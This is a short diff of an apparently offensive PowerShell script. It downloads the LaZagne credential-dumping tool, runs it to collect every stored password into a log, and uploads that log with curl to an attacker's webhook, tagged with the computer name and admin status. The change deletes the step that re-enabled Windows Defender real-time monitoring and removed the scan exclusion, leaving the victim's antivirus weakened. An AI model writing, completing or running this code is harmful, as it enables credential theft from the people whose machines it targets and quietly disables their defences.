@@ -22,11 +22,6 @@ Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
 & "$dir\lazagne.exe" all -vv > "$log"
 curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
 Start-Sleep -Seconds 20
-if ($Admin -eq 'True'){
-  Set-MpPreference -DisableRealtimeMonitoring $false
-
-  Remove-MpPreference -ExclusionPath "$dir"
-}
 $unhide = Get-Item "$dir" -Force
 $unhide.attributes='Normal'
 Remove-Item -Path "$dir" -Recurse -Force
